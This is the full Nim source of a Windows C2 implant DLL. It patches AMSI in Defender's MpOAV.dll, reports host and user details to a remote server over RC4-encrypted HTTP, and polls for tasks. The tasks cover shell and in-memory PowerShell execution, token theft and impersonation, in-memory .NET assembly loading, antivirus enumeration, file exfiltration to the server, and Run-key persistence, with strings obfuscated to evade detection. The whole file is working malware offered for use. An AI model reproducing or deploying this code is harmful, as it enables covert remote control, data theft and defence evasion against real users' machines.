import std/[json]
import strutils
import typetraits
import osproc
import strformat
import os
import nativesockets
import system
import net
import winim/lean
import winim/inc/lm
import sequtils
import winim/clr
import winim/com
import shlex
import byteutils
import sugar
import terminaltables
from times import format
import RC4
import registry
import nimprotect
import puppy
import random
from winim/utils import `&`
import winim/inc/[windef, winbase]
import encodings

randomize() 

var id: string = [$chr(rand(97..122)), $chr(rand(97..122)), $chr(rand(97..122)), $chr(rand(97..122))].join("")
var url: string = obfi("http://" & "URL")
var identifier = obfi("AUTH_KEY")
var encKey = obfi("RCKEY")
var impersonatingStatus: bool = false
var globalDuplicateTokenHandle: HANDLE = INVALID_HANDLE_VALUE

when defined amd64: 
    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
elif defined i386:
    const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]



proc ThreadUser(): string =
    var buffer = newString(UNLEN + 1)
    var cb = DWORD buffer.len
    if GetUserNameA(&buffer, &cb): 
        buffer.setLen(cb - 1)
        return buffer
    else:
        return "Failed to get username"

proc PatchAmsi(): int =
    var
        amsi: HMODULE
        cs: pointer
        op: DWORD
        t: DWORD


    let filesInPath = toSeq(walkDir(obfi("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\"), relative=true))
    var length = len(filesInPath)
    
    amsi = LoadLibrary(fmt"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\{filesInPath[length-1].path}\\MpOAV.dll")
    if amsi == 0:
        return 1

    cs = GetProcAddress(amsi, "DllGetClassObject")
    if cs == nil:  
        return 1

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        return 0


type OSVersionInfoExW {.importc: obfi("OSVERSIONINFOEXW"), header: obfi("<windows.h>").} = object
    dwOSVersionInfoSize: ULONG
    dwMajorVersion: ULONG
    dwMinorVersion: ULONG
    dwBuildNumber: ULONG
    dwPlatformId: ULONG
    szCSDVersion: array[128, WCHAR]
    wServicePackMajor: USHORT
    wServicePackMinor: USHORT
    wSuiteMask: USHORT
    wProductType: UCHAR
    wReserved: UCHAR

proc rtlGetVersion(lpVersionInformation: var OSVersionInfoExW): NTSTATUS
    {.cdecl, importc: obfi("RtlGetVersion"), dynlib: obfi("ntdll.dll").}

# Get Windows build based on rtlGetVersion
proc getWindowsVersion() : string =
    var
        versionInfo: OSVersionInfoExW

    discard rtlGetVersion(versionInfo)
    var vInfo = obfi("Windows ") & $versionInfo.dwMajorVersion & obfi(" build ") & $versionInfo.dwBuildNumber
    result = vInfo
    echo result
    
proc register() =
    var threadContext = ThreadUser()

    
    var adminstat: string = ""
    if os.isAdmin() == false:
        adminstat = "0"
    else:
        adminstat = "1"

    var hostname = getHostname()

    const source = obfi("http://ipv4.icanhazip.com")

    var amsistate = PatchAmsi()

    var operatingSystem = getWindowsVersion()

    let response = get(source)
    var resultIP = $response.body.strip()

    let body = %*{
        toRC4(encKey,obfi("id")): toRC4(encKey,id),
        toRC4(encKey,obfi("authKey")): toRC4(encKey,identifier),
        toRC4(encKey,obfi("username")): toRC4(encKey,threadContext),
        toRC4(encKey,obfi("isAdmin")): toRC4(encKey,adminstat),
        toRC4(encKey,obfi("os")): toRC4(encKey,operatingSystem),
        toRC4(encKey,obfi("hostname")): toRC4(encKey,hostName), 
        toRC4(encKey,obfi("publicIP")): toRC4(encKey,resultIP), 
        toRC4(encKey,obfi("amsi")): toRC4(encKey,$amsistate)


    }
    try:
        let cb_url = fmt"{url}/reg"
        let response = post($cb_url, @[("Content-Type", "application/json"),("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.3")],$body)
        echo $response.code
    finally:
        echo "done"



proc spawnCommandWithImpersonatedToken(command: string, hToken: HANDLE): string =
    var commandLine = obfi("cmd.exe /c ") & command
    var si: STARTUPINFO
    var pi: PROCESS_INFORMATION
    var sa: SECURITY_ATTRIBUTES
    ZeroMemory(addr sa, DWORD(sizeof(sa)))
    sa.nLength = DWORD(sizeof(sa))
    sa.bInheritHandle = TRUE
    var pipe_err: string = obfi("Failed to create pipe, Error: ")
    var failed_to_set_handle_info: string = obfi("Failed to set handle information, Error: ")
    var process_err: string = obfi("Failed to create process, Error: ")

    var hStdOutRead, hStdOutWrite: HANDLE
    if CreatePipe(addr hStdOutRead, addr hStdOutWrite, addr sa, 0) == 0:
        return fmt"{pipe_err} {GetLastError()}"

    if SetHandleInformation(hStdOutWrite, HANDLE_FLAG_INHERIT, 0) == 0:
        CloseHandle(hStdOutRead)
        CloseHandle(hStdOutWrite)
        return fmt"{failed_to_set_handle_info} {GetLastError()}"

    ZeroMemory(addr si, sizeof(si))
    si.cb = sizeof(si).DWORD
    si.dwFlags = STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES
    si.wShowWindow = SW_HIDE.WORD
    si.hStdOutput = hStdOutWrite
    si.hStdError = hStdOutWrite

    var promake = CreateProcessWithTokenW(
        hToken,
        LOGON_WITH_PROFILE,
        nil,
        commandLine,
        0,
        nil,
        NULL,
        addr si,
        addr pi
    )
    if promake == 0:
        CloseHandle(hStdOutRead)
        CloseHandle(hStdOutWrite)
        return fmt"{process_err} {GetLastError()}"

    CloseHandle(hStdOutWrite)

    var buffer: array[4096, char]
    var bytesRead: DWORD
    var rawOutput = ""
    while true:
        if ReadFile(hStdOutRead, addr buffer, sizeof(buffer) - 1, addr bytesRead, nil) == 0 or bytesRead == 0:
            break
        buffer[bytesRead] = '\0'
        for i in 0 ..< int(bytesRead):
            rawOutput.add($buffer[i])

    CloseHandle(hStdOutRead)

    WaitForSingleObject(pi.hProcess, INFINITE)
    CloseHandle(pi.hProcess)
    CloseHandle(pi.hThread)

    try:
        result = convert(rawOutput, destEncoding = "UTF-8", srcEncoding = "CP1252")
    except:
        result = "Error converting output to UTF-8: " & getCurrentExceptionMsg()

    return result

proc steal_token(pid: int): string = 
    var ress = ""
    var failed_to_open_process: string = obfi("Failed to open process")
    var cannot_open_process: string = obfi("Cannot open process ($1)")
    var succes_opening_handle: string = obfi("[*] Succeded opening handle on: ")
    var handle_id: string = obfi("    \\-- Handle ID is: ")
    var failed_to_query_tokens: string = obfi("Failed to query tokens")
    var cannot_query_tokens: string = obfi("Cannot query tokens ($1)")
    var succes_opening_process_token: string = obfi("[*] Succeded opening process token: ")
    var handle_id_token: string = obfi("    \\-- Handle ID is: ")
    var process_token_id: string = obfi("    \\-- Process Token ID is: ")
    var failed_to_duplicate_tokens: string = obfi("Failed to duplicate tokens")
    var cannot_duplicate_tokens: string = obfi("Cannot duplicate tokens ($1)")
    var succes_token_duplication: string = obfi("[*] Succeded duplicating token: ")
    var imperosnation_result: string = obfi("[*] Impersonation result: ")
    var failed_to_impersonate_user: string = obfi("[*] Failed to impersonate user")
    var running_thread_context: string = obfi("    \\-- Running the thread in the context of: ")
    let processId: int = pid

    var
        process_token: HANDLE
        duplicateTokenHandle: HANDLE

    var hProcess: HANDLE = OpenProcess(MAXIMUM_ALLOWED, false, cast[DWORD](processId));
    if not (bool)hProcess:
        ress.add(fmt"{failed_to_open_process}" & "\n")
        raise newException(Exception, cannot_open_process % [$GetLastError()])
    else:
        var successOpenProcess = fmt"{succes_opening_handle}{processId} {(bool)hProcess}" & "\n"
        var HandleId = fmt"{handle_id} {hProcess}" & "\n"
        ress.add(successOpenProcess)
        ress.add(HandleId)  



    var getToken: HANDLE = OpenProcessToken(hProcess, MAXIMUM_ALLOWED, cast[PHANDLE](addr(process_token)))
    if not bool(getToken):
        ress.add(fmt"{failed_to_query_tokens}" & "\n")
        raise newException(Exception, cannot_query_tokens % [$GetLastError()])
    else:
        var successOpenProcessToken = fmt"{succes_opening_process_token} {(bool)getToken}" & "\n"
        var THandleId = fmt"{handle_id_token} {getToken}" & "\n"
        var ProcessTokenId = fmt"{process_token_id} {process_token}" & "\n"
        ress.add(successOpenProcessToken)
        ress.add(THandleId)
        ress.add(ProcessTokenId)


    var tokenDuplication = DuplicateTokenEx(process_token, cast[DWORD](MAXIMUM_ALLOWED), NULL, securityImpersonation, cast[TOKEN_TYPE](tokenPrimary), &duplicateTokenHandle)
    if not bool(tokenDuplication):
        ress.add(fmt"{failed_to_duplicate_tokens}" & "\n")
        raise newException(Exception, cannot_duplicate_tokens % [$GetLastError()])
    else:
        var successTokenDuplication = fmt"{succes_token_duplication} {(bool)tokenDuplication}" & "\n\n"
        ress.add(successTokenDuplication)

        
    var impresult = ImpersonateLoggedOnUser(duplicateTokenHandle)
    var impresultStatus = fmt"{imperosnation_result} {(bool)impresult}" & "\n"
    ress.add(impresultStatus)
    

    globalDuplicateTokenHandle = duplicateTokenHandle

    if bool(impresult) == FALSE:
        var failimp = fmt"{failed_to_impersonate_user}" & "\n"
        ress.add(failimp)

    impersonatingStatus = true
    
    var curUser = ThreadUser()
    var contextstatus = fmt"{running_thread_context} {curUser}" & "\n\n"
    ress.add(contextstatus)
    

    return ress

proc rev2self(): string =
    var ress = ""
    var rev_imp_str: string = obfi("[*] Reverting Impersonation...")
    var rev_imp_res: string = obfi("[*] Revert Impersonation result: ")
    var rev_thread_context: string = obfi("    \\-- Reverted thread context to: ")
    
    ress.add(rev_imp_str & "\n")
    var revImpersonate = RevertToSelf()
    
    ress.add(fmt"{rev_imp_res} {bool(revImpersonate)}" & "\n")

    var curUser = ThreadUser()
    ress.add(fmt"{rev_thread_context} {curUser}" & "\n")

    impersonatingStatus = false
    globalDuplicateTokenHandle = nil

    return ress

proc sendResult(input: string) =

    var curUser = ThreadUser()


    let body = %*{
        toRC4(encKey,"id"): toRC4(encKey,id),
        toRC4(encKey,"data"): toRC4(encKey,input),
        toRC4(encKey,"context"): toRC4(encKey,curUser),
        toRC4(encKey,"impersonating"): toRC4(encKey,$impersonatingStatus)

    }
    try:
        let cb_url = fmt"{url}/result"
        let response = post($cb_url, @[("Content-Type", "application/json"),("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.3")],$body)
        echo $response.code
    finally:
        echo "done"

proc uploadFile(path: string) =
    try:
        var filecontent = readFile(path)
        var filename = path.split("\\")[^1]



        let body = %*{
            toRC4(encKey,"id"): toRC4(encKey,id),
            toRC4(encKey,"data"): toRC4(encKey,fileContent),
            toRC4(encKey,"filename"): toRC4(encKey,filename)
        }

        try:
            let cb_url = fmt"{url}/result"
            let response = post($cb_url, @[("Content-Type", "application/json"),("X-Upload", "true"),("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.3")],$body)
            echo $response.code
        finally:
            echo "done"
    except:
        var errmsg: string = obfi("[-] Error uploading file, check syntax and file if file exists!")
        sendResult(errmsg & "\n")

proc getTask(): (string, string) =
    let source = fmt"{url}/tasks/" & id

    let response = get(source, headers = @[("Content-Type", "application/json"),("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.3")])
    var result = $response.body.strip()


    let jsonNode = parseJson(result)
    try:
        echo jsonNode[0]
    except:
        return ("[]", "[]")


    var cmd = jsonNode[0].getStr()
    cmd = fromRC4(encKey,cmd)
    var additionalData = if jsonNode.len > 1: jsonNode[1].getStr() else: ""
    additionalData = fromRC4(encKey,additionalData)

    
    return (cmd, additionalData)

proc getAv() : string =
    let wmisec = GetObject(obfi(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\securitycenter2"))
    for avprod in wmisec.execQuery(obfi("SELECT displayName FROM AntiVirusProduct\n")):
        result.add($avprod.displayName & "\n")
    result = result.strip(trailing = true)


proc handleShellCommand(MainTask: string): string =
    let command = MainTask.split(" ")[1 .. ^1].join(" ")
    var ost = spawnCommandWithImpersonatedToken(command, globalDuplicateTokenHandle)
    return ost


proc postmandper() =

    register()
    var sleepVar: int = 5000
    while true:
        try:
            sleep(sleepVar)
            let (MainTask, SecondaryTask) = getTask()

            
            
            if MainTask.split(" ")[0] == obfi("sleep"):
                var taskArgs = MainTask.split(" ")[1 .. ^1]
                let taskStr = taskArgs.join(" ")
                var res: string = obfi("Callback interval changed to: ") & taskStr
                sendResult(res)
                sleepVar = parseInt(taskStr)

            elif MainTask == "[]":
                echo "debug"
            
            elif MainTask == "exit":
                quit(1)
            
            elif MainTask.split(" ")[0] == obfi("tShell"):
                let result = handleShellCommand(MainTask)
                sendResult(result)
            
            elif MainTask == obfi("GetAV"):
                var result = getAv()
                sendResult(result)

            
            elif MainTask.split(" ")[0] == obfi("steal_token"):
                var taskArgs = MainTask.split(" ")[1 .. ^1]
                let taskStr = taskArgs.join(" ")
                var res = steal_token(parseInt(taskStr))
                sendResult(res)

            elif MainTask == obfi("rev2self"):
                var res = rev2self()
                sendResult(res)

            elif MainTask == obfi("whoami"):
                var curUser = ThreadUser()
                sendResult(curUser)
            
            elif MainTask.split(" ")[0] == obfi("execute-ASM"):
                var params: string = "" 
                var paramsList = MainTask.split(" ")[2 .. ^1]
                params = paramsList.join(" ")
                var payloadStr = SecondaryTask

                let payloadParts=payloadStr.split(",")
                var buf:seq[byte] 


                var AMSIres = PatchAmsi()
                var state = ""
                if AMSIres == 0:
                    state = obfi("[+] AMSI patched!\n")
                if AMSIres == 1:
                    state = obfi("[-] Error patching AMSI!\n")
                if AMSIres == 2:
                    state = obfi("[+] AMSI already patched!\n")
                
                for i in payloadParts:
                    buf.add(hexToSeqByte(i))
            
                
                var assembly = load(buf)

                
                dump assembly
                var arr = toCLRVariant(shlex(params).words, VT_BSTR) 

                let
                    mscor = load(obfi("mscorlib"))
                    io = load(obfi("System.IO"))
                    Console = mscor.GetType(obfi("System.Console"))
                    StringWriter = io.GetType(obfi("System.IO.StringWriter"))
                
                    
                var sw = @StringWriter.new()
                var oldConsOut = @Console.Out
                @Console.SetOut(sw)

                assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))

                var res = fromCLRVariant[string](sw.ToString())
                sendResult(fmt"{state}{res}")
                
                @Console.SetOut(oldConsOut)
            
            elif MainTask.split(" ")[0] == obfi("pwsh"):
                var params: string = "" 
                var paramsList = MainTask.split(" ")[1 .. ^1]
                params = paramsList.join(" ")
                



                var res = PatchAmsi()
                var state = ""
                if res == 0:
                    state = obfi("[+] AMSI patched!\n")
                if res == 1:
                    state = obfi("[-] Error patching AMSI!\n")
                if res == 2:
                    state = obfi("[+] AMSI already patched!\n")


                var ress = ""
                var Automation = load(obfi("System.Management.Automation"))
                var RunspaceFactory = Automation.GetType(obfi("System.Management.Automation.Runspaces.RunspaceFactory"))

                var runspace = @RunspaceFactory.CreateRunspace()

                runspace.Open()

                try:
                    var pipeline = runspace.CreatePipeline()
                    pipeline.Commands.AddScript(params)
                    pipeline.Commands.Add(obfi("Out-String"))

                    var results = pipeline.Invoke()

                    for i in countUp(0,results.Count()-1):  
                        ress.add($results.Item(i))
                        sendResult(fmt"{state}{ress}")
                except:
                    sendResult(obfi("[-] Error executing PowerShell command!\n"))
                finally:
                    runspace.Close()

            elif MainTask.split(" ")[0] == obfi("ls"):
                var args = MainTask.split(" ")[1 .. ^1]  
                var argString = args.join(" ")
                var path : string = argString
                if path == "":
                    path = getCurrentDir()
                else:
                    path = path

                var dateTimeFormat : string = obfi("dd-MM-yyyy H:mm:ss")

                let t2 = newUnicodeTable()
                t2.separateRows = false
                t2.setHeaders(@[newCell("Name", pad=5), newCell("Size", rightpad=10), newCell("Last Modified", pad=2)])

                for kind, path in walkDir(path):
                    case kind:
                    of pcFile:
                        var fileName: string = "" 
                        var namelist = path.split("\\")
                        fileName = namelist.join(" ")
                        var size = getFileSize(path)
                        var lastaccess = getLastModificationTime(path)


                        for fileIndex in namelist:
                            if fileIndex == namelist[^1]:
                                #echo fileIndex
                                t2.addRow(@["--F-- "&fileIndex, $size, $lastaccess.format(dateTimeFormat)])
                    of pcDir:
                        var dirlist = path.split("\\")
                        var lastaccess = getLastModificationTime(path)

                        for fileIndex in dirlist:
                            if fileIndex == dirlist[^1]:
                                #echo fileIndex
                                t2.addRow(@["--D-- "&fileIndex, "N/A", $lastaccess.format(dateTimeFormat)])
                    of pcLinkToFile:
                        echo obfi("Link to file: "), path
                    of pcLinkToDir:
                        echo obfi("Link to dir: "), path
                var OKmsg = obfi("[+] Listing directory: ") & path
                sendResult(OKmsg&"\n" & render(t2) & "\n")
            
            elif MainTask.split(" ")[0] == obfi("cd"):
                var args = MainTask.split(" ")[1 .. ^1]  
                var argString = args.join(" ")
                var dir : string = argString
                var currentDIR = getCurrentDir()
                if dir == "":
                    var errmsg: string = obfi("[-] Invalid argument, please supply at least one directory...")
                    sendResult(errmsg & "\n")
                else:
                    setCurrentDir(dir)
                    currentDIR = getCurrentDir()
                    var OKmsg: string = obfi("[+] Changed working directory to: ") & currentDIR
                    sendResult(OKmsg & "\n")
            
            elif MainTask.split(" ")[0] == "pwd":
                var currentDIR = getCurrentDir()
                var OKmsgDIR: string = obfi("[+] Current working directory: ") & currentDIR
                sendResult(OKmsgDIR & "\n")

            elif MainTask.split(" ")[0] == obfi("shell"):
                var command = MainTask.split(" ")[1 .. ^1]
                var commandString = command.join(" ")
                var result = execProcess(obfi("cm") & obfi("d /c ") & commandString,options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
                sendResult(result)
            
            elif MainTask.split(" ")[0] == obfi("persist"):
                var
                    regPath : string
                    handle : registry.HKEY
                    regname_str : string
                    binname_str : string
                    path : string

                var regname = MainTask.split(" ")[1]
                regname_str = regname.join(" ")
                var binname = MainTask.split(" ")[2 .. ^1]
                binname_str = binname.join(" ")
                
                path = "HK"&"CU\\S"&"oftwa"&"re\\Mi"&"cro"&"sof"&"t\\Windo"&"ws\\Curr"&"entVers"&"ion\\R"&"un"

                regPath = path.split("\\", 1)[1]
                handle = registry.HKEY_CURRENT_USER
                setUnicodeValue(regPath, regname_str, binname_str, handle)  

                sendResult(obfi("[+] Registry persistence set! in ") & path & obfi("with name ") & regname_str & obfi("and value ") &  binname_str & "\n")
            
            elif MainTask.split(" ")[0] == obfi("download"):
                var command = MainTask.split(" ")[1 .. ^1]
                var commandString = command.join(" ")
                var file : string = commandString
                uploadFile(file)
            

            else:
                while MainTask != "[]":
                    if MainTask == "[]":
                        break
                    else:
                        sendResult(obfi("[-] Invalid command: ") & MainTask & "\n")
                        break
        except:
            var errmsg: string = obfi("[-] Unexcpeted error occured!, cant reach server, trying to register again in 5 seconds...")
            echo errmsg
            sleep(5000)


proc NimMain() {.cdecl, importc.}

proc Ost(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
    NimMain()
    postmandper()
    return true